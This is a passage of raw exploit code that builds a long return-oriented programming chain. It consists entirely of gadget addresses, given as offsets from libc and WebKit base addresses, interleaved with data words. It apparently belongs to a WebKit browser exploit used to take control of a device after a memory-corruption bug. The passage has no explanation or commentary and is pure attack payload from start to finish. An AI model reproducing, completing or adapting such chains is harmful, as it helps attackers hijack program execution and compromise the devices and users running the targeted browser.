set_gadgets([
ropchain+75208, 
ropchain+75224, 
libc_base+811575, 
ropchain+75240, 
libc_base+811575, 
ropchain+85632, 
libc_base+759626, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+75360, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+75376, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+75520, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+75488, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+75504, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+75592, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+793877, 
ropchain+75648, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575 
]);
db([7, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+75792, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([4294967284, 4294967295]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+75880, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+75896, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+76048, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+76080, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+76032, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+76064, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+76200, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+76216, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+76184, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+877175, 
libc_base+793877, 
ropchain+76320, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+76336, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+1838146, 
libc_base+793877, 
ropchain+76424, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+76480, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+76600, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+76632, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+76616, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+270096, 
libc_base+793877, 
ropchain+76792, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+76760, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+76744, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([24, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+877546, 
libc_base+793877, 
ropchain+76848, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+206806 
]);
db([0, 0]); 
set_gadgets([
libc_base+523896, 
libc_base+793877, 
ropchain+76952, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+76984, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+76968, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+77144, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+77112, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+77096, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([24, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+877546, 
libc_base+793877, 
ropchain+77200, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+206806 
]);
db([0, 0]); 
set_gadgets([
libc_base+523896, 
libc_base+793877, 
ropchain+77304, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+77336, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+77320, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+77496, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+77464, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+77448, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([24, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+877546, 
libc_base+793877, 
ropchain+77552, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+206806 
]);
db([0, 0]); 
set_gadgets([
libc_base+523896, 
libc_base+793877, 
ropchain+77656, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+77688, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+77672, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+77760, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+77776, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+77896, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+77880, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([4294967283, 4294967295]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+759626, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+78024, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+78040, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+78184, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+78152, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+78168, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+78256, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+793877, 
ropchain+78312, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+78408, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([4294967284, 4294967295]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+78496, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+78512, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+78664, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+78696, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+78648, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+78680, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+78816, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+78832, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+78800, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+1838146, 
libc_base+793877, 
ropchain+78920, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+78976, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+79096, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+79128, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+79112, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+270096, 
libc_base+793877, 
ropchain+79288, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+79256, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+79240, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([24, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+877546, 
libc_base+793877, 
ropchain+79344, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+206806 
]);
db([0, 0]); 
set_gadgets([
libc_base+523896, 
libc_base+793877, 
ropchain+79448, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+79480, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+79464, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+79640, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+79608, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+79592, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([24, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+877546, 
libc_base+793877, 
ropchain+79696, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+206806 
]);
db([0, 0]); 
set_gadgets([
libc_base+523896, 
libc_base+793877, 
ropchain+79800, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+79832, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+79816, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+79992, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+79960, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+79944, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([24, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+877546, 
libc_base+793877, 
ropchain+80048, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+206806 
]);
db([0, 0]); 
set_gadgets([
libc_base+523896, 
libc_base+793877, 
ropchain+80152, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+80184, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+80168, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+80256, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+80272, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+80432, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+80400, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+80384, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([24, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+877546, 
libc_base+793877, 
ropchain+80488, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+206806 
]);
db([0, 0]); 
set_gadgets([
libc_base+523896, 
libc_base+793877, 
ropchain+80592, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+80624, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+80608, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+80720, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+80704, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+80816, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+80904, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+80920, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+81064, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+81032, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+81048, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+81136, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+793877, 
ropchain+81192, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575 
]);
db([7, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+81336, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([4294967284, 4294967295]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+81424, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+81440, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+81592, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+81624, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+81576, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+81608, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+81744, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+81760, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+81728, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+877175, 
libc_base+793877, 
ropchain+81864, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+81880, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+1838146, 
libc_base+793877, 
ropchain+81968, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+82024, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+82096, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+82152, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
webkit_base+865136, 
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+82256, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([4294967283, 4294967295]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+82344, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+82360, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+270096, 
libc_base+793877, 
ropchain+82520, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+82488, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+82472, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([24, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+877546, 
libc_base+793877, 
ropchain+82576, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+206806 
]);
db([0, 0]); 
set_gadgets([
libc_base+523896, 
libc_base+793877, 
ropchain+82680, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+82712, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+82696, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+82872, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+82840, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+82824, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([24, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+877546, 
libc_base+793877, 
ropchain+82928, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+206806 
]);
db([0, 0]); 
set_gadgets([
libc_base+523896, 
libc_base+793877, 
ropchain+83032, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+83064, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+83048, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+83136, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+83152, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+83312, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+83280, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+83264, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([24, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+877546, 
libc_base+793877, 
ropchain+83368, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+206806 
]);
db([0, 0]); 
set_gadgets([
libc_base+523896, 
libc_base+793877, 
ropchain+83472, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+83504, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+83488, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+83600, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+83584, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+83696, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+83784, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+83800, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+83944, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+83912, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+83928, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+84016, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+793877, 
ropchain+84072, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+84168, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([4294967284, 4294967295]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+84256, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+84272, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+84424, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+84456, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+84408, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+84440, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+84576, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+84592, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+84560, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+1838146, 
libc_base+793877, 
ropchain+84680, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+84736, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+84808, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+84864, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
webkit_base+865136, 
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+84968, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([4294967284, 4294967295]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+85056, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+85072, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+85224, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+85256, 
webkit_base+7438103, 
libc_base+882884, 
